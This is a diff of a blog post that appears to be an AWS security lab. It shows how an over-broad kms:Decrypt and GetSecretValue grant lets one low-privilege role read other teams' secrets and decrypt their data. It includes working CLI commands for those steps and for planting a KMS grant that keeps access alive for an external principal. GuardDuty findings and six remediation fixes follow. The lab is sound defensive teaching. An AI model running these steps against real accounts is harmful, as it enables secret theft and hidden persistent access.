@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — Secrets Manager and KMS Key Abuse: When One Shared Key Decrypts Everything"
+title: "Lab Secrets Manager and KMS Key Abuse: When One Shared Key Decrypts Everything"
 date: 2026-07-08T10:00:00
 categories:
   - AWS Security Labs
@@ -15,17 +15,17 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab demonstrating how an over-broad kms:Decrypt and secretsmanager:GetSecretValue grant on a single low-privilege role exposes secrets and ciphertext belonging to completely unrelated applications — and how a KMS grant becomes a persistence mechanism that survives IAM credential rotation.
+description: A hands-on lab demonstrating how an over-broad kms:Decrypt and secretsmanager:GetSecretValue grant on a single low-privilege role exposes secrets and ciphertext belonging to completely unrelated applications and how a KMS grant becomes a persistence mechanism that survives IAM credential rotation.
 toc: true
 pin: false
 math: false
 mermaid: false
-image:
+image: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F22d200f8670dbdb3e253a90eee5098477c95c23d%2F2023%2F10%2F03%2Faws_secrets_manager_800x400.png&f=1&nofb=1&ipt=3092218b947cd3c44fdff377d9a9de665f30e5c2cb80fcb371555fea6bea203f
 ---
 
 ## Objective
 
-Start with credentials for a low-privilege "reporting application" role that was granted `kms:Decrypt` and `secretsmanager:GetSecretValue` on every resource in the account — a shortcut taken so the app "could decrypt its own config without anyone having to figure out the exact ARNs."
+Start with credentials for a low-privilege "reporting application" role that was granted `kms:Decrypt` and `secretsmanager:GetSecretValue` on every resource in the account  a shortcut taken so the app "could decrypt its own config without anyone having to figure out the exact ARNs."
 Use that over-grant to read secrets belonging to two completely unrelated applications, decrypt a ciphertext blob that was never meant for this role, and then plant a KMS grant that keeps decrypt access alive for an external principal even after the original credentials are rotated.
 Then fix it with per-application keys, explicit key policies, encryption context conditions, and grant auditing.
 
@@ -35,9 +35,9 @@ Then fix it with per-application keys, explicit key policies, encryption context
 
 ## Why a "Fine-Looking" Key Policy Isn't Enough
 
-KMS key policies get reviewed a lot less carefully than they should, because the default one *looks* restrictive — it grants access only to the account's root, which reads like "nobody outside this account can touch it." What that default policy actually does is delegate all real access control to IAM identity-based policies. The key policy is not doing the restricting; your IAM policies are.
+KMS key policies get reviewed a lot less carefully than they should, because the default one *looks* restrictive  it grants access only to the account's root, which reads like "nobody outside this account can touch it." What that default policy actually does is delegate all real access control to IAM identity-based policies. The key policy is not doing the restricting; your IAM policies are.
 
-That's a confused-deputy setup waiting to happen. If even one role in the account has `kms:Decrypt` on `Resource: *` — a shortcut that's extremely common, because scoping KMS permissions to exact key ARNs is one more thing to get right during setup — that role can decrypt *anything* encrypted under *any* CMK the account owns, not just the one thing it was built for.
+That's a confused-deputy setup waiting to happen. If even one role in the account has `kms:Decrypt` on `Resource: *`  a shortcut that's extremely common, because scoping KMS permissions to exact key ARNs is one more thing to get right during setup  that role can decrypt *anything* encrypted under *any* CMK the account owns, not just the one thing it was built for.
 
 This lab is about that gap: a single over-broad grant on a low-value "reporting" role turning into read access on a payments team's Stripe key and HR's third-party API token, plus a way to keep that access alive after the original role is locked down.
 
@@ -153,7 +153,7 @@ aws iam create-role --role-name reporting-app-role --assume-role-policy-document
 aws iam put-role-policy --role-name reporting-app-role --policy-name reporting-app-inline --policy-document file://reporting-app-policy.json
 ```
 
-> 📸 **SCREENSHOT:** IAM console showing `reporting-app-role`'s inline policy with `secretsmanager:GetSecretValue` and `kms:Decrypt` both scoped to `Resource: *`
+IAM console showing `reporting-app-role`'s inline policy with `secretsmanager:GetSecretValue` and `kms:Decrypt` both scoped to `Resource: *`
 
 Assume this role to simulate the attacker who has obtained its credentials.
 
@@ -173,7 +173,7 @@ aws secretsmanager list-secrets --query 'SecretList[].Name'
 ]
 ```
 
-The role has no business need to touch anything but its own database credentials — but the IAM policy doesn't say that anywhere.
+The role has no business need to touch anything but its own database credentials  but the IAM policy doesn't say that anywhere.
 
 ```bash
 aws secretsmanager get-secret-value --secret-id payments-service/stripe-key --query SecretString --output text
@@ -185,7 +185,7 @@ aws secretsmanager get-secret-value --secret-id hr-system/adp-api-token --query 
 {"adp_api_token":"tok_live_adpREDACTEDsensitive"}
 ```
 
-> 📸 **SCREENSHOT:** `aws secretsmanager get-secret-value` against `payments-service/stripe-key`, returning plaintext from `reporting-app-role`'s credentials
+`aws secretsmanager get-secret-value` against `payments-service/stripe-key`, returning plaintext from `reporting-app-role`'s credentials
 
 **GuardDuty finding:**
 
@@ -193,7 +193,7 @@ aws secretsmanager get-secret-value --secret-id hr-system/adp-api-token --query 
 Exfiltration:IAMUser/AnomalousBehavior
 ```
 
-GuardDuty's identity anomaly detection baselines which API calls and resources each principal normally touches. `reporting-app-role` calling `GetSecretValue` against secrets it has never accessed before — belonging to two different teams — is exactly the kind of behavioral deviation this finding family is built to catch.
+GuardDuty's identity anomaly detection baselines which API calls and resources each principal normally touches. `reporting-app-role` calling `GetSecretValue` against secrets it has never accessed before  belonging to two different teams  is exactly the kind of behavioral deviation this finding family is built to catch.
 
 ---
 
@@ -220,15 +220,15 @@ The key policy returned is the AWS default:
 }
 ```
 
-This is the confused deputy laid bare: the key policy itself names nothing more specific than "the account root," which reads as safe. But it means *every* IAM policy in the account is the real gatekeeper — and one of them, `reporting-app-role`'s, grants `kms:Decrypt` on everything. The key never distinguished between "the reporting app" and "anyone in this AWS account with a `kms:Decrypt` allow statement."
+This is the confused deputy laid bare: the key policy itself names nothing more specific than "the account root," which reads as safe. But it means *every* IAM policy in the account is the real gatekeeper  and one of them, `reporting-app-role`'s, grants `kms:Decrypt` on everything. The key never distinguished between "the reporting app" and "anyone in this AWS account with a `kms:Decrypt` allow statement."
 
-> 📸 **SCREENSHOT:** `aws kms get-key-policy` output showing the unmodified default policy — no explicit principal restriction beyond the account root
+ `aws kms get-key-policy` output showing the unmodified default policy — no explicit principal restriction beyond the account root
 
 ---
 
 ## Phase 3 — Decrypt Ciphertext That Was Never Meant for This Role
 
-`kms:Decrypt` on the shared key doesn't just expose the three Secrets Manager entries — it exposes *anything at all* encrypted under `alias/app-secrets-key`, including the S3 config blob from Step 0.3.
+`kms:Decrypt` on the shared key doesn't just expose the three Secrets Manager entries  it exposes *anything at all* encrypted under `alias/app-secrets-key`, including the S3 config blob from Step 0.3.
 
 ```bash
 aws s3 cp s3://payments-configs-lab-demo/prod/config.json ./config.json.enc
@@ -245,7 +245,7 @@ aws kms decrypt \
 }
 ```
 
-> 📸 **SCREENSHOT:** decrypted plaintext from an S3 object belonging to the payments service, obtained entirely through `reporting-app-role`'s KMS access — no S3 permissions on that bucket were even required beyond `s3:GetObject`, because SSE-KMS decryption happens via the KMS grant, not an S3-level ACL
+ decrypted plaintext from an S3 object belonging to the payments service, obtained entirely through `reporting-app-role`'s KMS access  no S3 permissions on that bucket were even required beyond `s3:GetObject`, because SSE-KMS decryption happens via the KMS grant, not an S3-level ACL
 
 **GuardDuty finding:**
 
@@ -259,7 +259,7 @@ A burst of `kms:Decrypt` calls against ciphertext outside this identity's normal
 
 ## Phase 4 — Persistence via a KMS Grant
 
-Rather than relying on `reporting-app-role`'s credentials — which might get rotated or revoked once the compromise is noticed — the attacker plants a grant on the CMK for an external, attacker-controlled principal:
+Rather than relying on `reporting-app-role`'s credentials  which might get rotated or revoked once the compromise is noticed  the attacker plants a grant on the CMK for an external, attacker-controlled principal:
 
 ```bash
 aws kms create-grant \
@@ -275,9 +275,9 @@ aws kms create-grant \
 }
 ```
 
-> 📸 **SCREENSHOT:** `aws kms create-grant` output showing a `GrantId` issued for an external account's role
+ `aws kms create-grant` output showing a `GrantId` issued for an external account's role
 
-This is the part of the lab that matters most for incident response: **KMS grants don't appear in the key policy.** Reviewing `get-key-policy` after this attack shows the exact same default policy as before — nothing looks different. The only way to see the grant is to explicitly list them:
+This is the part of the lab that matters most for incident response: **KMS grants don't appear in the key policy.** Reviewing `get-key-policy` after this attack shows the exact same default policy as before  nothing looks different. The only way to see the grant is to explicitly list them:
 
 ```bash
 aws kms list-grants --key-id alias/app-secrets-key
@@ -301,7 +301,7 @@ Even after `reporting-app-role`'s credentials are rotated and the role itself de
 Persistence:IAMUser/AnomalousBehavior
 ```
 
-`kms:CreateGrant` naming an external account as grantee is a rare, high-signal action in most environments — exactly the kind of persistence-tactic anomaly this finding family is designed to surface.
+`kms:CreateGrant` naming an external account as grantee is a rare, high-signal action in most environments  exactly the kind of persistence-tactic anomaly this finding family is designed to surface.
 
 ---
 
@@ -317,7 +317,7 @@ aws kms create-key --description "payments-service dedicated key"
 aws kms create-alias --alias-name alias/payments-service-key --target-key-id <new-key-id>
 ```
 
-Re-encrypt each secret under its own application's key. A compromised `reporting-app-role` can now decrypt only what `reporting-app/db-creds` was ever encrypted under — the blast radius stops at the boundary of one application, by construction, rather than by hoping the IAM policy is exactly right.
+Re-encrypt each secret under its own application's key. A compromised `reporting-app-role` can now decrypt only what `reporting-app/db-creds` was ever encrypted under  the blast radius stops at the boundary of one application, by construction, rather than by hoping the IAM policy is exactly right.
 
 ### Fix 2 — Scope IAM Grants to Specific ARNs
 
@@ -331,7 +331,7 @@ Re-encrypt each secret under its own application's key. A compromised `reporting
 }
 ```
 
-Never grant `kms:Decrypt` or `secretsmanager:GetSecretValue` on `Resource: *` — it should be exceptional enough to justify a code review comment when it happens.
+Never grant `kms:Decrypt` or `secretsmanager:GetSecretValue` on `Resource: *`  it should be exceptional enough to justify a code review comment when it happens.
 
 ### Fix 3 — Restrict the Key Policy Itself, Don't Rely on IAM Alone
 
@@ -364,7 +364,7 @@ Never grant `kms:Decrypt` or `secretsmanager:GetSecretValue` on `Resource: *` �
 }
 ```
 
-Explicitly naming which principals may use the key — and explicitly denying `kms:CreateGrant` to everyone except a dedicated key-admin role — closes off the persistence path from Phase 4 even if an application role's IAM policy is later over-broadened by mistake again.
+Explicitly naming which principals may use the key  and explicitly denying `kms:CreateGrant` to everyone except a dedicated key-admin role  closes off the persistence path from Phase 4 even if an application role's IAM policy is later over-broadened by mistake again.
 
 ### Fix 4 — Bind Decrypt Access to Encryption Context
 
@@ -391,7 +391,7 @@ kms.encrypt(
 }
 ```
 
-Even on a shared key, this condition means `reporting-app-role` can only decrypt ciphertext that was encrypted with `EncryptionContext={"app": "reporting-app"}` — the payments and HR secrets, encrypted with their own context values, become mathematically undecryptable by this role regardless of what the IAM `Resource` field says.
+Even on a shared key, this condition means `reporting-app-role` can only decrypt ciphertext that was encrypted with `EncryptionContext={"app": "reporting-app"}`  the payments and HR secrets, encrypted with their own context values, become mathematically undecryptable by this role regardless of what the IAM `Resource` field says.
 
 ### Fix 5 — Audit and Restrict Grants Specifically
 
@@ -402,7 +402,7 @@ for key in $(aws kms list-keys --query 'Keys[].KeyId' --output text); do
 done
 ```
 
-Wire `kms:CreateGrant` into the same EventBridge alerting used for logging tampering in the previous lab — it's rare enough in most accounts that any occurrence outside of expected automation deserves immediate review.
+Wire `kms:CreateGrant` into the same EventBridge alerting used for logging tampering in the previous lab  it's rare enough in most accounts that any occurrence outside of expected automation deserves immediate review.
 
 ### Fix 6 — Add Resource Policies on the Secrets Themselves
 
@@ -423,17 +423,17 @@ aws secretsmanager put-resource-policy \
   }'
 ```
 
-A resource policy on the secret is a second, independent gate — even if an application role's IAM policy is over-broadened again in the future, the secret itself refuses to be read by anyone other than its named owner.
+A resource policy on the secret is a second, independent gate  even if an application role's IAM policy is over-broadened again in the future, the secret itself refuses to be read by anyone other than its named owner.
 
 ---
 
 ## Key Takeaways
 
-- The AWS default KMS key policy looks restrictive but isn't — it trusts the account root and delegates all real access control to IAM identity policies, so one over-broad `kms:Decrypt` grant defeats it for everything encrypted under that key
-- Sharing a single CMK across multiple applications means a compromise of any one over-privileged identity can decrypt everything under it, not just what that identity is supposed to touch — one key per application is a blast-radius decision, not a convenience decision
-- `kms:CreateGrant` is a persistence mechanism that survives IAM credential rotation and role deletion, and it doesn't show up when reviewing a key's resource policy — `kms:ListGrants` needs to be part of routine hygiene and incident response, not an afterthought
+- The AWS default KMS key policy looks restrictive but isn't it trusts the account root and delegates all real access control to IAM identity policies, so one over-broad `kms:Decrypt` grant defeats it for everything encrypted under that key
+- Sharing a single CMK across multiple applications means a compromise of any one over-privileged identity can decrypt everything under it, not just what that identity is supposed to touch  one key per application is a blast-radius decision, not a convenience decision
+- `kms:CreateGrant` is a persistence mechanism that survives IAM credential rotation and role deletion, and it doesn't show up when reviewing a key's resource policy  `kms:ListGrants` needs to be part of routine hygiene and incident response, not an afterthought
 - Encryption context conditions bind a decrypt permission to the specific data the caller should be allowed to touch, functioning as real defense-in-depth even when the IAM policy behind it is broader than it should be
-- Key policies and Secrets Manager resource policies should explicitly allow-list principals rather than relying on IAM identity policies as the only gate — belt-and-suspenders against exactly this kind of over-grant
+- Key policies and Secrets Manager resource policies should explicitly allow-list principals rather than relying on IAM identity policies as the only gate  belt-and-suspenders against exactly this kind of over-grant
 
 ---
 
